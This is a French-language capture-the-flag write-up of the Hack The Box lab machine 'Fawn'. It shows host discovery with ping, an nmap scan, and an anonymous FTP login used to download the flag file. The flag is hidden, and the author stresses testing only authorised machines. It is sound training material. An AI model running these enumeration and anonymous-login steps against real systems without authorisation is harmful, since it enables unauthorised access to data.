---
title: "Fawn"
date: 2025-11-24
description: "Une connexion anonyme sur FTP?"
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, linux, tier-0]
slug: fawn
---

# Introduction

**Fawn** est la seconde box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). Elle permet de découvrir un autre service potentiellement exploitable durant un pentest : le **FTP**.

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.
:::

## Vidéo Walkthrough

<iframe
  width="100%"
  style={{aspectRatio: '16/9'}}
  src="https://www.youtube.com/embed/Y32-D6f8HZ4"
  title="Fawn Walkthrough"
  frameBorder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
  allowFullScreen
/>

---

## Reconnaissance (Information gathering)

### Découverte d'hôte (Asset discovery)

La première étape est de vérifier que la machine répond avec la commande `ping`.

```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.130.0

PING 10.129.130.0 (10.129.130.0) 56(84) bytes of data.
64 bytes from 10.129.130.0: icmp_seq=1 ttl=63 time=16.1 ms
64 bytes from 10.129.130.0: icmp_seq=2 ttl=63 time=15.5 ms
^C
```

### Énumération des services

```bash
┌─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.130.0

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

Port **21/tcp** ouvert. Le service **FTP** (vsftpd 3.0.3) est non chiffré. Sur des machines mal configurées, il peut accepter des connexions anonymes.

---

## Pré-exploitation

### Evaluation de vulnérabilité

On tente une connexion interactive via `ftp 10.129.130.0`.

```bash
┌─[user@parrot]─[~]
└──╼ $ftp 10.129.130.0

Connected to 10.129.130.0.
220 (vsFTPd 3.0.3)
Name (10.129.130.0:user):
```

Le service présente une invite d'authentification. On va tenter le compte `anonymous` avec un mot de passe vide.

---

## Exploitation

### Accès initial

```bash
Name (10.129.130.0:user): anonymous
331 Please specify the password.
Password:

230 Login successful.
ftp> ls

-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Connexion validée ! On télécharge le flag.

```bash
ftp> get flag.txt
ftp> exit
```

### Post-Exploitation

```bash
┌─[user@parrot]─[~]
└──╼ $cat flag.txt

035{...hidden..}815
```

La machine est **pwned** !

---

## Pour aller plus loin

Script Python de récupération automatique du flag :
[MohamedOutougane/Fawn_Automated](https://github.com/MohamedOutougane/Fawn_Automated)
